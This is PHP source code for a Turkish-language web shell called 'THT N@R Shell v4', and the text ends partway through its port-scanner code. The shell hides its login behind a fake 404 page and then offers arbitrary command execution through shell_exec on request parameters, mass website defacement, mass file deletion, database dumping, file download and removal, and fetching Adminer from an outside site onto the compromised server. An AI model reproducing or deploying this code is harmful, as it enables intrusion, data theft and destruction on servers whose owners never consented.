<?php
if (isset($_GET["indir"])) {
    chmod($_GET["indir"], 0666);
    function dosyaDownload($dosya)
    {
        if (isset($dosya) && file_exists($dosya)) {
            header("Content-length: " . filesize($dosya));
            header("Content-Type: application/octet-stream");
            header(
                'Content-Disposition: attachment; filename="' . $dosya . '"'
            );
            readfile("$dosya");
            exit();
        } else {
            echo "<center>Dosya Seçilmedi</center>";
        }
    }
    dosyaDownload($_GET["indir"]);
} ?>
<?php
if (isset($_GET["sil"])) {
    chmod($_GET["sil"], 0666);
    $sil = unlink($_GET["sil"]);
    if ($sil) {
        echo "Silinme işlemi başarılı";
    } else {
        echo "Silinme işlemi başarısız";
    }
}
$color = "6dff57";
$default_use_ajax = true;
$default_charset = "Windows-1251";
$auth_pass = "thtcaptainkanka";
$default_action = "FilesMan";
@ini_set("error_log", null);
@ini_set("log_errors", 0);
@ini_set("max_execution_time", 0);
@set_time_limit(0);
function wsoLogin()
{
    die('<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8">
<title>404</title>
<link href="https://fonts.googleapis.com/css?family=Itim" rel="stylesheet">
<meta http-equiv="Content-Type" content="text/html;charset=UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="theme-color" content="#464646">
<meta name="msapplication-navbutton-color" content="#464646">
<meta name="apple-mobile-web-app-status-bar-style" content="#464646">
<link rel="icon" type="image/png" href="images/favicon-32x32.png" sizes="32x32" />
<link rel="icon" type="image/png" href="images/favicon-16x16.png" sizes="16x16" />
<style>
	

#kutu{

background:transparent;
opacity:0;

}


</style>
</head>
<body style="background:#8f9190;text-align: center;margin-top:13%;">

	
		<font face="sans-serif" color="white"><div style="font-size: 40px;">
<b>404</b></div></font>
<font face="sans-serif" color="white"><div style="font-size: 30px;">
<b>Not Found</b></div></font>
		

	
<br><br>
	<div id="kutu">
	<form action="" method="POST">
		
		<input type="password" name="pass" placeholder="Sifrenizi yazınız."><br><br>
	<button type="submit" name="submit">Giris</button>

	</form>
	
	</div>
	<script>

var kutu=document.getElementById("kutu");



window.onkeydown=function(olay){


var y=kutu.offsetTop, x=kutu.offsetLeft;



if(olay.keyCode==39)
{
kutu.style.opacity=1;

}

}

</script>
</body>
</html>');
    exit();
}
function WSOsetcookie($k, $v)
{
    $_COOKIE[$k] = $v;
    setcookie($k, $v);
}
if (isset($_POST["pass"])) {
    $passpost = htmlspecialchars($_POST["pass"]);
}
if (!empty($auth_pass)) {
    if (isset($_POST["pass"]) and $_POST["pass"] == $auth_pass) {
        WSOsetcookie(md5($_SERVER["HTTP_HOST"]), $auth_pass);
    }
    if (
        !isset($_COOKIE[md5($_SERVER["HTTP_HOST"])]) or
        $_COOKIE[md5($_SERVER["HTTP_HOST"])] != $auth_pass
    ) {
        wsoLogin();
    }
}
$asdy89sad78af8a8f7as88a = "a";
$cvbcv98b7c89n798vbcn80b9v = "a";
error_reporting(0);
ob_start();
session_start();
$asddsa = basename($_SERVER["SCRIPT_FILENAME"]);
chmod($asddsa, 0666);
if (!isset($asdy89sad78af8a8f7as88a)) {
    exit();
}
$urlaa = "https://" . $_SERVER["HTTP_HOST"] . "" . $_SERVER["SCRIPT_NAME"] . "";
$urlaaa = basename($urlaa);
echo $urlaaa;
ob_start();
$self = $_SERVER["PHP_SELF"];
ini_set("memory_limit", "1000M");
class DBYedek
{
    private $tablolar = [];
    private $baglan;
    private $sonuc;
    private $error = [];
    public function __construct()
    {
        global $dbhost, $dbuser, $dbpass, $dbdata;
        try {
            $this->baglan = new PDO(
                "mysql:host={$dbhost};dbname={$dbdata}",
                $dbuser,
                $dbpass,
                [
                    PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
                    PDO::MYSQL_ATTR_INIT_COMMAND => "SET NAMES utf8",
                ]
            );
        } catch (PDOException $e) {
            echo "<b>HATA:Baglantı hatası</b> " . $e->getMessage();
            $this->kapat();
            exit();
        }
    }
    public function kapat()
    {
        if ($this->baglan) {
            $this->baglan = null;
        }
    }
    public function Ice_Aktar($dosya, $maxKomut)
    {
        $sonzaman = time() + $maxKomut;
        $progressdosya = $dosya . "_temp";
        ($fp = fopen($dosya, "r")) or
            die("<br>" . $dosya . ": <b>Dosyası Açılamıyor!</b>");
        $doPozisyon = 0;
        if (file_exists($progressdosya)) {
            $doPozisyon = file_get_contents($progressdosya);
            fseek($fp, $doPozisyon);
        }
        $donguSayaci = 0;
        $query = "";
        while ($sonzaman > time() and ($line = fgets($fp, 1024000))) {
            if (
                substr($line, 0, 2) == "--" or
                trim($line) == "" or
                substr($line, 0, 2) == "/*"
            ) {
                continue;
            }
            $query .= $line;
            if (substr(trim($query), -1) == ";") {
                try {
                    $islem = $this->baglan->prepare($query);
                    $islem->execute();
                } catch (PDOException $e) {
                    echo $this->hatabul(
                        $e->getTrace(),
                        $e->getCode(),
                        $e->getMessage()
                    );
                    $this->kapat();
                    exit();
                }
                $query = "";
                file_put_contents($progressdosya, ftell($fp));
                $donguSayaci++;
            }
        }
        if (feof($fp)) {
            @unlink($progressdosya);
            echo "Döküm başarıyla içe aktarıldı!<br>Geçici temp dosyası temizlendi..";
        } else {
            echo '<html><head> <meta http-equiv="refresh" content="' .
                ($maxKomut + 1) .
                '">';
            echo ftell($fp) .
                "/" .
                filesize($dosya) .
                " - " .
                round(ftell($fp) / filesize($dosya), 2) * 100 .
                "%" .
                "<br>";
            echo $donguSayaci .
                " sorgular işlendi! lütfen yeniden yükleyin, veya tarasD�cının otomatik yenilenmesini bekleyin!";
        }
    }
    public function Disa_Aktar($yol, $zip, $drop, $vtip)
    {
        global $dbdata;
        $this->sonuc = "-- " . $dbdata . " veritabanı için sql yedeği.\n\n";
        $this->TabloCek($vtip);
        $this->Olustur($drop);
        $date = date("d-m-Y_H-i-s");
        if ($zip == true) {
            $dosya = $yol . "captainkanka-$dbdata-$date.sql.zip";
            $zip = new ZipArchive();
            if ($zip->open($dosya, ZIPARCHIVE::CREATE) !== true) {
                exit("Zip Dosya açılamadı <$dosya>\n");
            }
            $zip->addFromString("captainkanka-$dbdata-$date.sql", $this->sonuc);
            $zip->close();
        } else {
            $dosya = $yol . "captainkanka-$dbdata-$date.sql";
            $fp = fopen($dosya, "w");
            fwrite($fp, $this->sonuc);
            fclose($fp);
        }
        return $dosya;
    }
    private function Olustur($drop)
    {
        foreach ($this->tablolar as $tbl) {
            $this->sonuc .=
                "-- `" . $tbl["t_adi"] . "` tablosu için tablo yapısı.\n\n";
            if ($drop) {
                $this->sonuc .=
                    "DROP TABLE IF EXISTS `" . $tbl["t_adi"] . "`;\n";
            }
            $this->sonuc .= $tbl["t_yapisi"] . ";\n\n";
            $this->sonuc .= $tbl["t_verisi"] . "\n\n\n";
        }
    }
    private function TabloCek($vtip)
    {
        try {
            $sql = $this->baglan->query("SHOW TABLES");
            $sonuc = $sql->fetchAll();
            $i = 0;
            foreach ($sonuc as $tablo) {
                $this->tablolar[$i]["t_adi"] = $tablo[0];
                ob_flush();
                flush();
                $this->tablolar[$i]["t_yapisi"] = $this->tabloYapisi($tablo[0]);
                ob_flush();
                flush();
                $this->tablolar[$i]["t_verisi"] = $this->dokumVeri(
                    $tablo[0],
                    $vtip
                );
                ob_flush();
                flush();
                $i++;
            }
            unset($sql);
            unset($sonuc);
            unset($i);
            return true;
        } catch (PDOException $e) {
            echo $this->hatabul(
                $e->getTrace(),
                $e->getCode(),
                $e->getMessage()
            );
            $this->kapat();
            exit();
        }
    }
    private function tabloYapisi($tabloAdi)
    {
        try {
            $sql = $this->baglan->query("SHOW CREATE TABLE " . $tabloAdi);
            $sonuc = $sql->fetchAll();
            $sonuc[0][1] = preg_replace(
                "/AUTO_INCREMENT=[\w]*./",
                "",
                $sonuc[0][1]
            );
            return $sonuc[0][1];
        } catch (PDOException $e) {
            echo $this->hatabul(
                $e->getTrace(),
                $e->getCode(),
                $e->getMessage()
            );
            $this->kapat();
            exit();
        }
    }
    private function sutunAdlari($tabloAdi)
    {
        try {
            $sutun = "";
            $sql = $this->baglan->query("SELECT * FROM $tabloAdi LIMIT 1");
            $toplm_sutun = $sql->columnCount();
            for ($counter = 0; $counter < $toplm_sutun; $counter++) {
                $clmn_meta = $sql->getColumnMeta($counter);
                if ($counter + 1 != $toplm_sutun) {
                    $sutun .= "`" . $clmn_meta["name"] . "`" . ", ";
                } else {
                    $sutun .= "`" . $clmn_meta["name"] . "`";
                }
            }
            return $sutun;
        } catch (PDOException $e) {
            echo $this->hatabul(
                $e->getTrace(),
                $e->getCode(),
                $e->getMessage()
            );
            $this->kapat();
            exit();
        }
    }
    private function Degistir($veri)
    {
        $veri = str_replace("'", "\'", $veri);
        $veri = str_replace("\n", "\\n", $veri);
        $veri = str_replace('"', '\"', $veri);
        return $veri;
    }
    private function dokumVeri($tabloAdi, $vtip)
    {
        try {
            $sql = $this->baglan->query("SELECT * FROM " . $tabloAdi);
            $sonuc = $sql->fetchAll(PDO::FETCH_NUM);
            $veri = "";
            $sayim = count($sonuc);
            if ($vtip == 1) {
                if ($sayim > 0) {
                    $veri =
                        "-- `" . $tabloAdi . "` tablosu için döküm verisi.\n\n";
                    for ($counter = 0; $counter < $sayim; $counter++) {
                        $veri .=
                            "INSERT INTO `" .
                            $tabloAdi .
                            "` VALUES ('" .
                            implode("','", $this->Degistir($sonuc[$counter])) .
                            "');\n";
                    }
                }
            } elseif ($vtip == 2) {
                if ($sayim > 0) {
                    $veri =
                        "-- `" . $tabloAdi . "` tablosu için döküm verisi.\n\n";
                    $veri .= "INSERT INTO `" . $tabloAdi . "` VALUES" . "\n";
                    for ($counter = 0; $counter < $sayim; $counter++) {
                        if ($counter + 1 != $sayim) {
                            $veri .=
                                "('" .
                                implode(
                                    "','",
                                    $this->Degistir($sonuc[$counter])
                                ) .
                                "'),\n";
                        } else {
                            $veri .=
                                "('" .
                                implode(
                                    "','",
                                    $this->Degistir($sonuc[$counter])
                                ) .
                                "');\n";
                        }
                    }
                }
            } elseif ($vtip == 3) {
                if ($sayim > 0) {
                    $veri =
                        "-- `" . $tabloAdi . "` tablosu için döküm verisi.\n\n";
                    for ($counter = 0; $counter < $sayim; $counter++) {
                        $veri .=
                            "INSERT INTO `" .
                            $tabloAdi .
                            "` (" .
                            $this->sutunAdlari($tabloAdi) .
                            ") VALUES ('" .
                            implode("','", $this->Degistir($sonuc[$counter])) .
                            "');\n";
                    }
                }
            } elseif ($vtip == 4) {
                if ($sayim > 0) {
                    $veri =
                        "-- `" . $tabloAdi . "` tablosu için döküm verisi.\n\n";
                    $veri .=
                        "INSERT INTO `" .
                        $tabloAdi .
                        "` (" .
                        $this->sutunAdlari($tabloAdi) .
                        ") VALUES" .
                        "\n";
                    for ($counter = 0; $counter < $sayim; $counter++) {
                        if ($counter + 1 != $sayim) {
                            $veri .=
                                "('" .
                                implode(
                                    "','",
                                    $this->Degistir($sonuc[$counter])
                                ) .
                                "'),\n";
                        } else {
                            $veri .=
                                "('" .
                                implode(
                                    "','",
                                    $this->Degistir($sonuc[$counter])
                                ) .
                                "');\n";
                        }
                    }
                }
            }
            return $veri;
        } catch (PDOException $e) {
            echo $this->hatabul(
                $e->getTrace(),
                $e->getCode(),
                $e->getMessage()
            );
            $this->kapat();
            exit();
        }
    }
    private function hatabul($hata, $kodu, $mesaj)
    {
        $htmsj = "<b>PHP PDO HATA:</b> " . strval($kodu) . "<br><br>";
        $i = 0;
        foreach ($hata as $a) {
            if ($i == 0) {
                $htmsj .= "<b>Class tarafı hata bilgileri</b><br>";
            } else {
                $htmsj .= "<b>Dosya tarafı hata bie�ileri</b><br>";
            }
            $htmsj .= "Hatalı Function: " . $a["function"] . "<br>";
            $htmsj .= "Hatalı Dosya: " . $a["file"] . "<br>";
            $htmsj .= "Hatalı Satır: " . $a["line"] . "<br><br>";
            $i++;
        }
        $htmsj .= "<b>Hata MSJ:</b> " . $mesaj;
        return $htmsj;
    }
}
?>

<html>

	<head>
		<title>THT N@R Shell v4</title>
		<link rel="icon" type="image/png" href="https://www.turkhackteam.org/styles/v1/tht/favicon.png" sizes="32x32" />
		<style>
			.btnnnnnn {
				text-shadow: 0 0 0.04em white 0 0 0.45em currentcolor;
				box-shadow: inset 0 0 0.3em 0 #4cc9f0, 0 0 0.5em 0#4cc9f0;
				border: solid 4px #4cc9f0;
				border-radius: 10px;
				text-decoration: none;
				color: #fff;
				font-family: "Varela Round", sans-serif;

				padding: 5px;

				position: relative;
				font-weight: 800;
				transition: 0.4s;
			}

			.btnnnnnn a {

				color: #fff;
				font-family: "Varela Round", sans-serif;

				font-weight: 900;
				transition: 0.4s;
			}

			.btnnnnnn::before {
				content: "";
				position: absolute;
				background: #4cc9f0;

				left: 0;

				transform: perspective(1em) rotateX(40deg) scale(1, 0.55);
				filter: blur(1em);
			}

			.btnnnnnn:hover {


				color: #fff;
				box-shadow: inset 0 0 0.2em 0 #309dbe, 0.5em 0.5em 0.5em #309dbe;
				text-shadow: 0;

			}

			.headbuton {
				display: flex;
				justify-content: center;
				align-items: center;
				flex-wrap: wrap;
			}

			.headbuton a {
				position: relative;
				display: inline-block;
				padding: 15px 30px;
				border: 2px solid #0f0;
				margin: 40px;
				text-transform: uppercase;
				font-weight: 600;
				text-decoration: none;
				letter-spacing: 2px;
				color: #fff;
				-webkit-box-reflect: below 0px linear-gradient(transparent, #0002);
				transition: 0.5s;
				transition-delay: 0s;
				filter: hue-rotate(80deg);
			}

			.headbuton a:hover {
				transition-delay: 1.5s;
				color: #000;
				box-shadow: 0 0 10px #0f0, 0 0 20px #0f0, 0 0 40px #0f0, 0 0 80px #0f0, 0 0 60px #0f0;
			}

			.headbuton a span {
				position: relative;
				z-index: 10213123210;
			}

			.headbuton a::before {
				content: "";
				position: absolute;
				left: -20px;
				top: 50%;
				transform: translateY(-50%);
				width: 20px;
				height: 2px;
				background: #0f0;
				box-shadow: 5px -8px 0 #0f0, 5px 8px 0 #0f0;
				transition: width 0.5s, left 0.5s, height 0.5s, box-shadow 0.5s;
				transition-delay: 1s, 0.5s, 0s, 0s;
			}

			.headbuton a:hover::before {
				width: 60%;
				height: 100%;
				left: -2px;
				box-shadow: 5px 0 0 #0f0, 5px 0 0 #0f0;
				transition-delay: 0s, 0.5s, 1s, 1s;
			}

			.headbuton a::after {
				content: "";
				position: absolute;
				right: -20px;
				top: 50%;
				transform: translateY(-50%);
				width: 20px;
				height: 2px;
				background: #0f0;
				box-shadow: -5px -8px 0 #0f0, -5px 8px 0 #0f0;
				transition: width 0.5s, left 0.5s, height 0.5s, box-shadow 0.5s;
				transition-delay: 1s, 0.5s, 0s, 0s;
			}

			.headbuton a:hover::after {
				width: 60%;
				height: 100%;
				right: -2px;
				box-shadow: -5px 0 0 #0f0, -5px 0 0 #0f0;
				transition-delay: 0s, 0.5s, 1s, 1s;
			}

			.ico {
				width: 5%;
			}
		</style>



	</head>

	<body style="background:#060c21;">
		<br>
		<center>
			<center>

				<img src="https://i.hizliresim.com/fbf569p.png" width="19%"><br>
				<div class="headbuton">
					<a href="https://intel.turkhackteam.org/"><span>İntel Platform</span></a>
					<a href="https://www.turkhackteam.org/"><span>Tht Ana Sayfa</span></a>
					<a href="https://ctf.turkhackteam.org/login.php"><span>Ctf Platform</span></a></br>
					<a href="<?php echo $urlaaa; ?>"><span>Shell Ana Sayfa</span></a>
				</div>
				<br>
				<div class="btnnnnnn" style="width:60%;">
					<font color="red">Sistem Adı :</font><?php echo php_uname(); ?><br>
					<font color="red">PHP : </font><?php echo phpversion(); ?> <br>
					<font color="red">Sizin Ip : </font><?php echo $_SERVER["REMOTE_ADDR"]; ?><br>
					<font color="red">Disk alanı : </font><?php
     $bytes = disk_free_space(".");
     $si_prefix = ["B", "KB", "MB", "GB", "TB", "EB", "ZB", "YB"];
     $base = 1024;
     $class = min((int) log($bytes, $base), count($si_prefix) - 1);
     echo sprintf("%1.2f", $bytes / pow($base, $class)) .
         " " .
         $si_prefix[$class] .
         "";
     ?> / <?php
 $bytes = disk_total_space("/");
 $si_prefix = ["B", "KB", "MB", "GB", "TB", "EB", "ZB", "YB"];
 $base = 1024;
 $class = min((int) log($bytes, $base), count($si_prefix) - 1);
 echo sprintf("%1.2f", $bytes / pow($base, $class)) .
     " " .
     $si_prefix[$class] .
     "";
 ?>


					<br>
				</div>

				<div class="headbuton">
					<?php
     if (isset($_GET["dir"])) {
         $dir = $_GET["dir"];
         chdir($dir);
     } else {
         $dir = getcwd();
     }
     function w($dir, $perm)
     {
         if (!is_writable($dir)) {
             return "<font color=red>" . $perm . "</font>";
         } else {
             return "<font color=lime>" . $perm . "</font>";
         }
     }
     function r($dir, $perm)
     {
         if (!is_readable($dir)) {
             return "<font color=red>" . $perm . "</font>";
         } else {
             return "<font color=lime>" . $perm . "</font>";
         }
     }
     if ($_GET["maschil"] == "MassDellete") {
         function Delete_massal($dir, $namafile)
         {
             if (is_writable($dir)) {
                 $dira = scandir($dir);
                 foreach ($dira as $dirb) {
                     $dirc = "$dir/$dirb";
                     $lokasi = $dirc . "/" . $namafile;
                     if ($dirb === ".") {
                         if (file_exists("$dir/$namafile")) {
                             unlink("$dir/$namafile");
                         }
                     } elseif ($dirb === "..") {
                         if (file_exists("" . dirname($dir) . "/$namafile")) {
                             unlink("" . dirname($dir) . "/$namafile");
                         }
                     } else {
                         if (is_dir($dirc)) {
                             if (is_writable($dirc)) {
                                 if ($lokasi) {
                                     echo "$lokasi > Silindi\n";
                                     unlink($lokasi);
                                     $massdel = Delete_massal($dirc, $namafile);
                                 }
                             }
                         }
                     }
                 }
             }
         }
         if (isset($_POST["start"])) {
             echo "<br><br><textarea class='form-control' rows='13' disabled='disabled'>";
             Delete_massal($_POST["d_dir"], $_POST["d_file"]);
             echo "</textarea>";
         } else {
             echo "<form method='post'>
					<p><i class='fa fa-folder'></i><font color='#fff' size='4' face='Verdana, Geneva, sans-serif'>Lokasyon</font></b></p>
					<input type='text' name='d_dir' value='$dir' class='form-control'><br>
					<p><i class ='fa fa-file'></i> <font color='#fff' size='4' face='Verdana, Geneva, sans-serif'>Dosya adı</font></b></p>
					<input type='text' name='d_file' placeholder='index.php' class='form-control'><br><br>
					<input type='submit' name='start' value='Sil' class='btn btn-danger form-control'>
			</form>";
         }
         exit();
     } /*
		Mass Deface
*/
     if ($_GET["maschil"] == "MassDeface") {
         function tipe_massal($dir, $namafile, $isi_script)
         {
             if (is_writable($dir)) {
                 $dira = scandir($dir);
                 foreach ($dira as $dirb) {
                     $dirc = "$dir/$dirb";
                     $lokasi = $dirc . "/" . $namafile;
                     if ($dirb === ".") {
                         file_put_contents($lokasi, $isi_script);
                     } elseif ($dirb === "..") {
                         file_put_contents($lokasi, $isi_script);
                     } else {
                         if (is_dir($dirc)) {
                             if (is_writable($dirc)) {
                                 echo "Berhasil => $lokasi\n";
                                 file_put_contents($lokasi, $isi_script);
                                 $MassDeface = tipe_massal(
                                     $dirc,
                                     $namafile,
                                     $isi_script
                                 );
                             }
                         }
                     }
                 }
             }
         }
         function tipe_biasa($dir, $namafile, $isi_script)
         {
             if (is_writable($dir)) {
                 $dira = scandir($dir);
                 foreach ($dira as $dirb) {
                     $dirc = "$dir/$dirb";
                     $lokasi = $dirc . "/" . $namafile;
                     if ($dirb === ".") {
                         file_put_contents($lokasi, $isi_script);
                     } elseif ($dirb === "..") {
                         file_put_contents($lokasi, $isi_script);
                     } else {
                         if (is_dir($dirc)) {
                             if (is_writable($dirc)) {
                                 echo "Berhasil => $dirb/$namafile\n";
                                 file_put_contents($lokasi, $isi_script);
                             }
                         }
                     }
                 }
             }
         }
         if (isset($_POST["start"])) {
             echo "<br><br><textarea class='form-control' rows='13' disabled='disabled'>";
             if ($_POST["tipe"] == "mahal") {
                 tipe_massal(
                     $_POST["d_dir"],
                     $_POST["d_file"],
                     $_POST["script"]
                 );
             } elseif ($_POST["tipe"] == "murah") {
                 tipe_biasa(
                     $_POST["d_dir"],
                     $_POST["d_file"],
                     $_POST["script"]
                 );
             }
             echo "</textarea>";
         } else {
             echo "<form method='post'>
				<center>
					<br><b><font color='#fff' size='6' face='Verdana, Geneva, sans-serif'>| Tipi Mass Deface |</font></b><br><br>
					<input id='toggle-on' class='toggle toggle-left' name='tipe' value='murah' type='radio' checked>
					<label for='toggle-on' class='butn'><b><font color='#fff' size='4' face='Verdana, Geneva, sans-serif'>Normal</font></b></label>
					<input id='toggle-off' class='toggle toggle-right' name='tipe' value='mahal' type='radio'>
					<label for='toggle-off' class='butn'><b><font color='#fff' size='4' face='Verdana, Geneva, sans-serif'>Masal</font></b></label>
				</center><hr>
				<p><i class='fa fa-folder'></i><b><font color='#fff' size='4' face='Verdana, Geneva, sans-serif'>Lokasyon</font></b></p>
				<input type='text' name='d_dir' value='$dir' class='form-control'><br>
				<p><i class ='fa fa-file'></i><b><font color='#fff' size='4' face='Verdana, Geneva, sans-serif'>Dosya Adı</font></b></p>
				<input type='text' name='d_file' placeholder='index.php' class='form-control'><br/>
				<p><i class ='fa fa-file'></i><b><font color='#fff' size='4' face='Verdana, Geneva, sans-serif'>Dosya İçeriği</font></b> </p>
				<textarea name='script' class='form-control' rows='5' placeholder='Hacked By Captainkanka'></textarea><br/><br>
				<input type='submit' name='start' value='Mass Deface' class='btn btn-danger form-control'><br/>
			</form>";
         }
         exit();
     }
     ?>
					<a href="<?php echo $self . "?adm"; ?>"><span>Adminer</span></a>
					<a href="<?php echo $self .
         "?veritabaniindirr"; ?>"><span>Veri Tabanı İndirici</span></a><br>
					<a href="<?php echo $self . "?porta"; ?>"><span>Port TarasD�cı</span></a><br>
					<a href="<?php echo $self .
         "?komutcalistirr"; ?>"><span>Komut Çalıştır</span></a><br>
					<a href="<?php echo $self . "?config"; ?>"><span>Config</span></a><br>
					<a href="<?php echo $self .
         "?maschil=MassDeface"; ?>"><span>Mass Deface</span></a><br>
					<a href="<?php echo $self .
         "?maschil=MassDellete"; ?>"><span>Mass Delete</span></a><br>
					<a href="<?php echo $self .
         "?shellbull"; ?>"><span>Tüm Shelleri Bul</span></a><br>
					<a href="<?php echo $self .
         "?tshellsil"; ?>"><span>Toplu Shell Sil</span></a><br>
				</div>
				<?php
    if (isset($_GET["adm"])) {
        $full = str_replace($_SERVER["DOCUMENT_ROOT"], "", $path);
        function adminer($url, $isi)
        {
            $fp = fopen($isi, "w");
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($ch, CURLOPT_FILE, $fp);
            return curl_exec($ch);
            curl_close($ch);
            fclose($fp);
            ob_flush();
            flush();
        }
        $admi32 = rand(9999, 99999);
        $admism = "captainkanka" . $admi32 . ".php";
        if (
            adminer(
                "https://www.adminer.org/static/download/4.8.1/adminer-4.8.1.php",
                $admism
            )
        ) {
            echo "<center><a href='./$admism' target='_blank'>-> Adminer Giriş <-</a></font></center><br/>";
        } else {
            echo "<center><font color=red>Adminer oluşturulamadı!</font></center><br/>";
        }
        exit();
    }
    if (isset($_GET["tshellsil"])) {
        $dosyaAc = fOpen("toplushell1233.txt", "r");
        $dosyaOku = fRead($dosyaAc, fileSize("toplushell1233.txt"));
        $sitedo = explode("/n", $dosyaOku);
        $sitedos = count($sitedo);
        for ($i = 0; $i <= $sitedos; $i++) {
            unlink($sitedo[$i]);
        }
        fClose($dosyaAc);
        if (file_exists("toplushell1233.txt")) {
            unlink("toplushell1233.txt");
        }
        header("Location:" . $urlaaa);
    }
    if (isset($_GET["komutcalistirr"])) {
        echo '<div class="btnnnnnn " style="width:50%;">
	<div class="headbuton">
	<a href="' .
            $self .
            '?systeminfo"><span>Sistem Bilgisi</span></a><br>
	<a href="' .
            $self .
            '?tasklist"><span>Çalışan Programlar</span></a><br>
	</div>
	<div class="headbuton">
	<a href="' .
            $self .
            '?netstat"><span>Aktif Bağlantılar</span></a><br>
	<a href="' .
            $self .
            '?arp"><span>Arp Tablosu</span></a><br>
	<a href="' .
            $self .
            '?ipconfig"><span>İp Config</span></a><br>
	</div>
	<center><form action="' .
            $self .
            '?komutcalistir" method="GET">
			<p><font color="#fff" size="5"><b>Komut Çalıştır</b></font></p>
            <input type="text" name="komut" placeholder="cmd.exe /c ipconfig"/> 
            <p><button style="width:7%;height:7%; background:transparent;" type="submit" name="komutcalistir" /><img  src="https://img.icons8.com/fluency/344/ok.png" width="100%"></button></p>
         </form></center></div>';
    }
    if (isset($_GET["ipconfig"])) {
        $komut = "cmd.exe /c ipconfig";
        $a = shell_exec($komut);
        echo "<br><div class='btnnnnnn' style='width:40%;'><pre>" .
            $a .
            "</pre></div><br>";
    }
    if (isset($_GET["systeminfo"])) {
        $komut = "cmd.exe /c systeminfo";
        $a = shell_exec($komut);
        echo "<br><div class='btnnnnnn' style='width:40%;'><pre>" .
            $a .
            "</pre></div><br>";
    }
    if (isset($_GET["tasklist"])) {
        $komut = "cmd.exe /c tasklist";
        $a = shell_exec($komut);
        echo "<br><div class='btnnnnnn' style='width:40%;'><pre>" .
            $a .
            "</pre></div><br>";
    }
    if (isset($_GET["arp"])) {
        $komut = "cmd.exe /c arp -a";
        $a = shell_exec($komut);
        echo "<br><div class='btnnnnnn' style='width:40%;'><pre>" .
            $a .
            "</pre></div><br>";
    }
    if (isset($_GET["netstat"])) {
        $komut = "cmd.exe /c netstat -a";
        $a = shell_exec($komut);
        echo "<br><div class='btnnnnnn' style='width:40%;'><pre>" .
            $a .
            "</pre></div><br>";
    }
    if (isset($_GET["komutcalistir"])) {
        $komut = $_GET["komut"];
        $a = shell_exec($komut);
        echo "<br><div class='btnnnnnn' style='width:40%;'><pre>" .
            $a .
            "</pre></div><br>";
    }
    if (isset($_GET["veritabaniindirr"])) {
        echo '<center><form class="btnnnnnn" style="width:40%;" action="' .
            $self .
            '?veritabaniindir" method="GET">
			<p><font color="#fff" size="5"><b>Sunucu</b></font></p>
            <input type="text" name="host" /> 
			<p><font color="#fff" size="5"><b>Kullanıcı Adı</b></font></p>
            <input type="text" name="kadi" /> 
			<p><font color="#fff" size="5"><b>Şifre</b></font></p>
            <input type="text" name="sifre" /> 
			<p><font color="#fff" size="5"><b>Veritabanı Adı</b></font></p>
            <input type="text" name="veritabani" /> 
            <p><button style="width:7%;height:7%; background:transparent;" type="submit" name="veritabaniindir" /><img  src="https://img.icons8.com/fluency/344/ok.png" width="100%"></button></p>
         </form></center>';
    }
    if (isset($_GET["veritabaniindir"])) {
        $sunucu = $_GET["host"];
        $kadi = $_GET["kadi"];
        $sifre = $_GET["sifre"];
        $veritabani = $_GET["veritabani"];
        ob_start();
        $dbhost = $sunucu;
        //Veritabanın bulunduğu host
        $dbuser = $kadi;
        //Veritabanı Kullanıcı Adı
        $dbpass = $sifre; //Veritabanı Şifresi
        $dbdata = $veritabani; //Veritabanı Adı
        $dbBackup = new DBYedek(); // class'imizla $dbBackup nesnemizi olusturduk //$kayityeri klasor yolu belirtirken sonunda mutlaka / olmali (klasoradi/) seklinde
        $kayityeri = ""; // ayni dizin için $kayityeri degiskeni bos birakilmali
        $arsiv = false; //Yedeği zip arsivi olarak almak için true // .sql olarak almak için false
        $tablosil = true; //DROP TABLE if EXISTS satırı eklemek için true // istenmiyorsa false //Veri için kullanılacak sözdizimi:
        $veritipi = 1; // INSERT INTO tbl_adı VALUES (1,2,3); //$veritipi	= 2; // INTO tbl_adı VALUES (1,2,3), (4,5,6), (7,8,9); //$veritipi	= 3; // INSERT INTO tbl_adı (sütun_A,sütun_B,sütun_C) VALUES (1,2,3); //$veritipi	= 4; // INSERT INTO tbl_adı (col_A,col_B,col_C) VALUES (1,2,3), (4,5,6), (7,8,9);
        $backup = $dbBackup->Disa_Aktar(
            $kayityeri,
            $arsiv,
            $tablosil,
            $veritipi
        );
        if ($backup) {
            echo '<div class="btnnnnnn" style="width:40%;">Sql dosyası shell dizinine oluşturuldu. <br><div class="headbuton"><a href="' .
                $backup .
                '" download="' .
                $backup .
                '"><span>İndirmek için tıklayın</span></a></div></div><br>';
        } else {
            echo "Beklenmedik hata oluştu!";
        }
        $dbBackup->kapat(); // $dbBackup nesnemizi kapattik
        ob_end_flush();
    }
    if (isset($_GET["dosyaolustur"])) {
        if (!empty($_GET["yol"])) {
            $yol = $_GET["yol"];
            $isim1 = $yol . "/" . $_GET["dosyaolustur1"];
            if (touch($isim1)) {
                echo "<center><font color='#fff'>Dosya Oluşturuldu</font></center>";
            } else {
                echo "<center><font color='#fff'>Dosya Oluşturulamadı</font></center>";
            }
        } else {
            $isim1 = $_GET["dosyaolustur1"];
            if (touch($isim1)) {
                echo "<center><font color='#fff'>Dosya Oluşturuldu</font></center>";
            } else {
                echo "<center><font color='#fff'>Dosya Oluşturulamadı</font></center>";
            }
        }
    }
    if (isset($_GET["klasorolustur"])) {
        if (!empty($_GET["yol"])) {
            $yol1 = $_GET["yol"];
            $isim = $yol1 . "/" . $_GET["klasorolustur1"];
            $olustur = mkdir($isim);
            if ($olustur) {
                echo "<center><font color='#fff'>Klasör Oluşturuldu.</font></center>";
            } else {
                echo "<center><font color='#fff'>Klasör Oluşturulamadı</font></center>";
            }
        } else {
            $isim = $_GET["klasorolustur1"];
            $olustur = mkdir($isim);
            if ($olustur) {
                echo "<center><font color='#fff'>Klasör Oluşturuldu.</font></center>";
            } else {
                echo "<center><font color='#fff'>Klasör Oluşturulamadı</font></center>";
            }
        }
    }
    if (isset($_GET["port"])) {
        ini_set("max_execution_time", 0);
        ini_set("memory_limit", -1);
        $host = $_GET["host"];
        $portbasla = $_GET["portb"];
        $portbit = $_GET["portbt"];
        $portlar = [0];
        $i = $portbasla;
        while ($i < $portbit) {
            array_push($portlar, $i);
